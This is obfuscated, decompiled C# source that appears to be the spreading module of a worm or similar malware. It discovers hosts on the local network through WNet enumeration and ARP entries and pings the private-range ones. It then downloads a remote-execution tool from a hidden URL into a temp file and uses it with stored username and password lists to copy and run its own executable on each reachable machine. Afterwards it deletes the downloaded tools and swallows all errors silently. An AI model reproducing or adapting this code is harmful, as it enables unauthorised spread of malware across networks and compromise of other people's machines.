using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

internal sealed class mrxeSdVVYWXFqpVy
{
	public enum bQhnKghiygbx
	{
		pGiofdtKTVCxl = 1,
		NCFneKVgxkCN,
		uUybhrQDuuH,
		IMwtoMGWJtN,
		ZTHLKqaXKbRKFK
	}

	public enum SGTVLqXglXqgx
	{
		AwWxvhzWZKNcglUa,
		eSWMMCTlpf,
		zBoFHtGeHObLlF,
		bBoOmyGJbLmWoxb
	}

	public enum GHgfFOrcsxyL
	{
		HhUyPeMTJPXArl = 1,
		fjXQKPpVrwfRdX = 2,
		gGxjNfpKRDb = 4,
		kBmyxtqIFSbm = 8,
		SPoVgLDaGUcuCiX = 16,
		lrFvahbkHdXN = 19
	}

	public enum QVAITefzvZKQM
	{
		INuzLEevUBtuB,
		IACZIeVCglyh,
		qHOsqewGjXl,
		pKYymeJuthab,
		TGxtLVTpZSDy,
		JeqYIqKFVbpp,
		kDcmsCXhdYR,
		NHOUReqjcSQC,
		iVTmLsYYfupnA,
		KBuCiFBztUP,
		fGCzLjXIKjVk,
		JxrBxUTPIYCdMu
	}

	public sealed class MsXudhWZpxx : IEnumerable
	{
		private enum OMgAhAzlkVj
		{
			XJfwCSVGygq = 0,
			dnMptFeWGoR = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class kNjTrcjjyM
		{
			public bQhnKghiygbx DCmdkEDKQwi = (bQhnKghiygbx)0;

			public SGTVLqXglXqgx DTQKJNyVjuCKVZT = SGTVLqXglXqgx.AwWxvhzWZKNcglUa;

			public QVAITefzvZKQM vvLslixeMqF = QVAITefzvZKQM.INuzLEevUBtuB;

			public GHgfFOrcsxyL hoBpuFpZHuVFqdt = (GHgfFOrcsxyL)0;

			public string OJVypjvseQUdWDt = null;

			public string ynuWzKYDHMGz = null;

			public string oUBpZnEQimSsoq = null;

			public string QptzmxezlPPbx = null;
		}

		private ArrayList toCPsMBsFOPTW = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern OMgAhAzlkVj WNetOpenEnumA(bQhnKghiygbx dwScope, SGTVLqXglXqgx dwType, GHgfFOrcsxyL dwUsage, kNjTrcjjyM p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern OMgAhAzlkVj WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern OMgAhAzlkVj WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(kNjTrcjjyM kNjTrcjjyM_0, bQhnKghiygbx bQhnKghiygbx_0, SGTVLqXglXqgx sgtvlqXglXqgx_0, GHgfFOrcsxyL ghgfFOrcsxyL_0, QVAITefzvZKQM qvaitefzvZKQM_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(bQhnKghiygbx_0, sgtvlqXglXqgx_0, ghgfFOrcsxyL_0, kNjTrcjjyM_0, out lphEnum) == OMgAhAzlkVj.XJfwCSVGygq)
			{
				OMgAhAzlkVj oMgAhAzlkVj;
				do
				{
					oMgAhAzlkVj = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (oMgAhAzlkVj)
					{
					case OMgAhAzlkVj.dnMptFeWGoR:
						continue;
					case OMgAhAzlkVj.XJfwCSVGygq:
						Marshal.PtrToStructure(intPtr, kNjTrcjjyM_0);
						if (kNjTrcjjyM_0.vvLslixeMqF == qvaitefzvZKQM_0)
						{
							toCPsMBsFOPTW.Add(kNjTrcjjyM_0.ynuWzKYDHMGz);
						}
						if ((kNjTrcjjyM_0.hoBpuFpZHuVFqdt & GHgfFOrcsxyL.fjXQKPpVrwfRdX) == GHgfFOrcsxyL.fjXQKPpVrwfRdX)
						{
							EnumerateServers(kNjTrcjjyM_0, bQhnKghiygbx_0, sgtvlqXglXqgx_0, ghgfFOrcsxyL_0, qvaitefzvZKQM_0);
						}
						continue;
					}
					break;
				}
				while (oMgAhAzlkVj != OMgAhAzlkVj.dnMptFeWGoR);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public MsXudhWZpxx(bQhnKghiygbx bQhnKghiygbx_0, SGTVLqXglXqgx sgtvlqXglXqgx_0, GHgfFOrcsxyL ghgfFOrcsxyL_0, QVAITefzvZKQM qvaitefzvZKQM_0)
		{
			kNjTrcjjyM kNjTrcjjyM_ = new kNjTrcjjyM();
			EnumerateServers(kNjTrcjjyM_, bQhnKghiygbx_0, sgtvlqXglXqgx_0, ghgfFOrcsxyL_0, qvaitefzvZKQM_0);
		}

		public IEnumerator GetEnumerator()
		{
			return toCPsMBsFOPTW.GetEnumerator();
		}
	}

	private sealed class OUQFZueUZiKq
	{
		public string ytnhbVLzfqeYzEsk;

		public string DFvBJXQHOru;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__d(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107386007)) && !string_0.StartsWith(getString_0(107386002)) && !string_0.StartsWith(getString_0(107386025)) && !string_0.Contains(getString_0(107385980))) || !TqzEDIyAXxOW(string_0))
			{
				return;
			}
			if (aSOyqwTwiifNb.NnZoLXRmVCvIOhK == getString_0(107396900))
			{
				for (int i = 0; i < nLhGhYcikTLv.Count; i++)
				{
					if (aSOyqwTwiifNb.hxCcwpobkJC)
					{
						if (File.Exists(ytnhbVLzfqeYzEsk))
						{
							aSOyqwTwiifNb.cMEEnMgkUxxsbbNh(ytnhbVLzfqeYzEsk, getString_0(107388180) + string_0 + getString_0(107401018) + nLhGhYcikTLv[i] + getString_0(107401041) + kgfEKngmzbZJFB[i] + getString_0(107401032) + Assembly.GetEntryAssembly()!.Location + getString_0(107388198));
						}
					}
					else if (File.Exists(DFvBJXQHOru))
					{
						aSOyqwTwiifNb.cMEEnMgkUxxsbbNh(DFvBJXQHOru, getString_0(107388180) + string_0 + getString_0(107401018) + nLhGhYcikTLv[i] + getString_0(107401041) + kgfEKngmzbZJFB[i] + getString_0(107400999) + Assembly.GetEntryAssembly()!.Location + getString_0(107388198));
					}
				}
			}
			else if (aSOyqwTwiifNb.hxCcwpobkJC)
			{
				if (File.Exists(ytnhbVLzfqeYzEsk))
				{
					aSOyqwTwiifNb.cMEEnMgkUxxsbbNh(ytnhbVLzfqeYzEsk, getString_0(107388180) + string_0 + getString_0(107400942) + Assembly.GetEntryAssembly()!.Location + getString_0(107388198));
				}
			}
			else if (File.Exists(DFvBJXQHOru))
			{
				aSOyqwTwiifNb.cMEEnMgkUxxsbbNh(DFvBJXQHOru, getString_0(107388180) + string_0 + getString_0(107401421) + Assembly.GetEntryAssembly()!.Location + getString_0(107388198));
			}
		}

		static OUQFZueUZiKq()
		{
			Strings.CreateGetStringDelegate(typeof(OUQFZueUZiKq));
		}
	}

	public static List<string> BcHKlbVTEdz;

	public static string bdSKLqOjCywV;

	public static List<string> nLhGhYcikTLv;

	public static List<string> kgfEKngmzbZJFB;

	public static List<string> bOSbtecXWwPEQKj;

	public List<string> BqOlYDjPVgIdN = new List<string>();

	public List<string> uupnLpZmraReU = new List<string>();

	public List<string> VBcykidhrSe = new List<string>();

	[NonSerialized]
	internal static GetString getString_0;

	public static void sLFEZAvoqZfC()
	{
		OUQFZueUZiKq CS_0024_003C_003E8__locals0 = new OUQFZueUZiKq();
		aSOyqwTwiifNb.pCTrEemjBb();
		List<aQbFQKBRzcpG> list = aQbFQKBRzcpG.zXktJoGFXOazd();
		foreach (aQbFQKBRzcpG item in list)
		{
			BcHKlbVTEdz.Add(item.IPAddress);
		}
		if (aSOyqwTwiifNb.KlnqoelvmWHjj.Count > 0)
		{
			BcHKlbVTEdz = BcHKlbVTEdz.Union(aSOyqwTwiifNb.KlnqoelvmWHjj).ToList();
		}
		CS_0024_003C_003E8__locals0.ytnhbVLzfqeYzEsk = getString_0(107389341);
		CS_0024_003C_003E8__locals0.DFvBJXQHOru = getString_0(107389341);
		try
		{
			CS_0024_003C_003E8__locals0.ytnhbVLzfqeYzEsk = rsbdlfWKlYvM();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.DFvBJXQHOru = dKEHCUhgwlU();
		}
		catch
		{
		}
		foreach (aQbFQKBRzcpG item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107385961)) || item2.IPAddress.StartsWith(getString_0(107385956)) || item2.IPAddress.StartsWith(getString_0(107385979)) || item2.IPAddress.Contains(getString_0(107385934)))
				{
					pfLRdymtBRbQLnSA.OwrPekrnNpCsvXq(item2.MacAddress, item2.IPAddress, getString_0(107401782));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(BcHKlbVTEdz, delegate(string string_0)
			{
				if ((string_0.StartsWith(OUQFZueUZiKq.getString_0(107386007)) || string_0.StartsWith(OUQFZueUZiKq.getString_0(107386002)) || string_0.StartsWith(OUQFZueUZiKq.getString_0(107386025)) || string_0.Contains(OUQFZueUZiKq.getString_0(107385980))) && TqzEDIyAXxOW(string_0))
				{
					if (aSOyqwTwiifNb.NnZoLXRmVCvIOhK == OUQFZueUZiKq.getString_0(107396900))
					{
						for (int i = 0; i < nLhGhYcikTLv.Count; i++)
						{
							if (aSOyqwTwiifNb.hxCcwpobkJC)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.ytnhbVLzfqeYzEsk))
								{
									aSOyqwTwiifNb.cMEEnMgkUxxsbbNh(CS_0024_003C_003E8__locals0.ytnhbVLzfqeYzEsk, OUQFZueUZiKq.getString_0(107388180) + string_0 + OUQFZueUZiKq.getString_0(107401018) + nLhGhYcikTLv[i] + OUQFZueUZiKq.getString_0(107401041) + kgfEKngmzbZJFB[i] + OUQFZueUZiKq.getString_0(107401032) + Assembly.GetEntryAssembly()!.Location + OUQFZueUZiKq.getString_0(107388198));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.DFvBJXQHOru))
							{
								aSOyqwTwiifNb.cMEEnMgkUxxsbbNh(CS_0024_003C_003E8__locals0.DFvBJXQHOru, OUQFZueUZiKq.getString_0(107388180) + string_0 + OUQFZueUZiKq.getString_0(107401018) + nLhGhYcikTLv[i] + OUQFZueUZiKq.getString_0(107401041) + kgfEKngmzbZJFB[i] + OUQFZueUZiKq.getString_0(107400999) + Assembly.GetEntryAssembly()!.Location + OUQFZueUZiKq.getString_0(107388198));
							}
						}
					}
					else if (aSOyqwTwiifNb.hxCcwpobkJC)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.ytnhbVLzfqeYzEsk))
						{
							aSOyqwTwiifNb.cMEEnMgkUxxsbbNh(CS_0024_003C_003E8__locals0.ytnhbVLzfqeYzEsk, OUQFZueUZiKq.getString_0(107388180) + string_0 + OUQFZueUZiKq.getString_0(107400942) + Assembly.GetEntryAssembly()!.Location + OUQFZueUZiKq.getString_0(107388198));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.DFvBJXQHOru))
					{
						aSOyqwTwiifNb.cMEEnMgkUxxsbbNh(CS_0024_003C_003E8__locals0.DFvBJXQHOru, OUQFZueUZiKq.getString_0(107388180) + string_0 + OUQFZueUZiKq.getString_0(107401421) + Assembly.GetEntryAssembly()!.Location + OUQFZueUZiKq.getString_0(107388198));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.ytnhbVLzfqeYzEsk))
			{
				File.Delete(CS_0024_003C_003E8__locals0.ytnhbVLzfqeYzEsk);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.DFvBJXQHOru))
			{
				File.Delete(CS_0024_003C_003E8__locals0.DFvBJXQHOru);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsbdlfWKlYvM()
	{
		if (IntPtr.Size == 8)
		{
			return knsDUbJVRridwf(new Uri(aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107401761))));
		}
		return knsDUbJVRridwf(new Uri(aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107401761))));
	}

	public static string dKEHCUhgwlU()
	{
		if (IntPtr.Size == 8)
		{
			return knsDUbJVRridwf(new Uri(aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107401648))));
		}
		return knsDUbJVRridwf(new Uri(aSOyqwTwiifNb.FEZRNsQdHf(getString_0(107401091))));
	}

	public static bool TqzEDIyAXxOW(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string knsDUbJVRridwf(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107401018), getString_0(107389341)).Remove(0, 3) + getString_0(107401013);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static mrxeSdVVYWXFqpVy()
	{
		Strings.CreateGetStringDelegate(typeof(mrxeSdVVYWXFqpVy));
		BcHKlbVTEdz = new List<string>();
		bdSKLqOjCywV = getString_0(107389341);
		nLhGhYcikTLv = new List<string>();
		kgfEKngmzbZJFB = new List<string>();
		bOSbtecXWwPEQKj = new List<string>();
	}
}
